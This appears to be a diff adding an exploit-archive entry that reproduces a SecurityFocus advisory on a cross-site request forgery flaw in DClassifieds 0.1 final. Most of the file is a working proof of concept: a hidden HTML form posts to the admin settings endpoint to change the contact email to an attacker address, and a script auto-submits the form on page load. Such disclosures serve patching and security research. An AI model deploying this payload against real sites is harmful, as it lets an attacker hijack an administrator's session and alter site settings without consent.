@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/51671/info
+
+DClassifieds is prone to a cross-site request-forgery vulnerability.
+
+Exploiting this issue may allow a remote attacker to perform certain administrative actions and gain unauthorized access to the affected application. Other attacks are also possible.
+
+DClassifieds 0.1 final is vulnerable; other versions may also be affected. 
+
+<form action="http://www.example.com/admin/settings/update/id/4" method="post">
+<input type="hidden" name="Settings[setting_name]" value="CONTACT_EMAIL">
+<input type="hidden" name="Settings[setting_value]" value="hacker@mail.com">
+<input type="hidden" name="Settings[setting_description]" value="Contact email">
+
+<input type="hidden" name="Settings[setting_show_in_admin]" value="1">
+
+<input type="hidden" name="yt0" value="Save">
+<input type="submit" id="btn">
+</form>
+<script>
+document.getElementById('btn').click();
+</script>
